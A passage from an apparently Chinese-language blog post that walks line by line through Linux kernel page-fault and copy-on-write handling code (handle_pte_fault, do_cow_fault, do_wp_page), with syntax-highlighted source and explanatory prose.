class="keyword">int</span> __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">pgd_t</span> *pgd;</span><br><span class="line"><span class="keyword">pud_t</span> *pud;</span><br><span class="line"><span class="keyword">pmd_t</span> *pmd;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(is_vm_hugetlb_page(vma)))</span><br><span class="line"><span class="keyword">return</span> hugetlb_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">pgd = pgd_offset(mm, address);</span><br><span class="line">pud = pud_alloc(mm, pgd, address);</span><br><span class="line"><span class="keyword">if</span> (!pud)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">pmd = pmd_alloc(mm, pud, address);</span><br><span class="line"><span class="keyword">if</span> (!pmd)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment"> * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment"> * is done, and goto retry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line"><span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">orig_pmd, flags);</span><br><span class="line"><span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">      orig_pmd, dirty);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment"> * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment"> * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"><span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment"> * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment"> * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment"> * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pte = pte_offset_map(pmd, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相信看过我前面那篇文章的都不会陌生<code>pgd | pud | pmd | pte</code>这四个页表，他们分表表示的是<code>页全局目录｜页上级目录｜页中间目录｜页表项</code>，这个函数中首先则是通过mm获取到pgd页全局目录，随后生成pud和pmd并为pmd创建中间项，在最后货渠道pte并进入到处理函数<code>handle_pte_fault</code>中。</p><h4 id="handle-pte-fault"><a href="#handle-pte-fault" class="headerlink" title="handle_pte_fault"></a><strong>handle_pte_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pte_t</span> entry;</span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment"> * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment"> * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment"> * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment"> * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment"> * a barrier will do.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">entry = *pte;</span><br><span class="line">barrier();</span><br><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line"><span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line"><span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line"> pte, pmd, flags);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_protnone(entry))</span><br><span class="line"><span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">ptl = pte_lockptr(mm, pmd);</span><br><span class="line">spin_lock(ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line"><span class="keyword">goto</span> unlock;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">pte, pmd, ptl, entry);</span><br><span class="line">entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br><span class="line"><span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">update_mmu_cache(vma, address, pte);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment"> * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment"> * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment"> * with threads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">&#125;</span><br><span class="line">unlock:</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数开头初始化<code>entry</code>为pte的内存页然后我们继续逐行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pte_present(entry)) &#123;</span><br><span class="line">  <span class="keyword">if</span> (pte_none(entry)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">      <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                               pte, pmd, flags);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">                      flags, entry);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, flags, entry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先判断页表是否存在于主存中，接着判断是否为none，如果为空则表示第一次访问该页，那么继续进入判断vma是否为匿名区，如果不是则执行<code>do_fault</code>返回物理页。如果该页不为空，软性缺页异常中的第二种情况，代表该页以前存在于主存中但是被调出了。</p><p>程序继续往后执行，下方代表的是内存页存在于主存中时的情况。</p><p>首先则是先加了一层锁<code>spin_lock(ptl);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">    <span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">                      pte, pmd, ptl, entry);</span><br><span class="line">  entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line">entry = pte_mkyoung(entry);</span><br></pre></td></tr></table></figure><p>首先通过flags判断是否是应为写操作引起的缺页异常，紧接着看对应的页是否可写，如果不可写则进入<code>do_wp_page</code>函数中。后续就是将该页标脏和标上已经访问过。</p><p>经过上述流程不难发现当一个进程首次访问一个不可写的内存页时会触发两次缺页异常，一次是页不存在于主存中的情况，第二次是下面存在于主存的情况。</p><p>那么首先我们先看第一次进入的情况，此时处理的函数为<code>do_fault</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">pte_unmap(page_table);</span><br><span class="line"><span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line"><span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">orig_pte);</span><br><span class="line"><span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要就是下面判断，如果是非写的操作引起的异常则进入<code>do_read_fault</code>函数，如果是非共享内存引起的异常则进入<code>do_cow_fault</code>，如果是因为共享内存引起的异常则进入<code>do_shared_fault</code>函数中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_cow_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line"><span class="keyword">if</span> (!new_page)</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">copy_user_highpage(new_page, fault_page, address, vma);</span><br><span class="line">__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">goto</span> uncharge_out;</span><br><span class="line">&#125;</span><br><span class="line">do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">pte_unmap_unlock(pte, ptl);</span><br><span class="line"><span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">unlock_page(fault_page);</span><br><span class="line">page_cache_release(fault_page);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment"> * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">uncharge_out:</span><br><span class="line">mem_cgroup_cancel_charge(new_page, memcg);</span><br><span class="line">page_cache_release(new_page);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据名字可以看出来这个函数是我们比较关注的函数，<code>new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</code>首先则就是创建一个物理页。<code>ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</code>这里读取文件的内容到<code>fault_page</code>中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fault_page)</span><br><span class="line">  copy_user_highpage(new_page, fault_page, address, vma);</span><br></pre></td></tr></table></figure><p>随后在这里将<code>fault_page</code>中的内容拷贝到<code>new_page</code>中去。</p><p><code>if (unlikely(!pte_same(*pte, orig_pte))) </code>这里验证pte和<code>orig_ptr</code>是否一致，如果不一致则表示pte中途被修改过那么直接释放两个内存页之后退出。</p><p><code>do_set_pte(vma, address, new_page, pte, true, true);</code>在这里设置pte中的标志位并且标上<code>dirty</code>标志位，不过因为会检测文件是否为可写如果不是则不会标记上<code>write</code>，最后释放<code>fault_page</code>结束函数。</p><p>在进行完第一步之后如果页面不可写的话就会进入到第二步中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_wp_page</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pte_t</span> *page_table, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">spinlock_t</span> *ptl, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function">__<span class="title">releases</span><span class="params">(ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line">old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!old_page) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment"> * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment"> * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">     (VM_WRITE|VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment"> * not dirty accountable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">page_cache_get(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">lock_page(old_page);</span><br><span class="line">page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line"> &amp;ptl);</span><br><span class="line"><span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">page_cache_release(old_page);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment"> * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment"> * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">unlock_page(old_page);</span><br><span class="line"><span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">unlock_page(old_page);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line"><span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">      ptl, orig_pte, old_page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">pte_unmap_unlock(page_table, ptl);</span><br><span class="line"><span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过<code>old_page = vm_normal_page(vma, address, orig_pte);</code>获取缺页的线性地址对应的<code>struct page</code>结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为<code>special mapping</code>，并无对应的<code>struct page</code>结构体。</p><p>紧接着判断是否为<code>special mapping</code>，如果是则会进入if分支，当然我们这里不是。</p><p>随后判断页面是否为匿名页并且不为KSM，如果成立并且可以成功上锁则进入以下语句。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">  page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">  unlock_page(old_page);</span><br><span class="line">  <span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">                       orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span 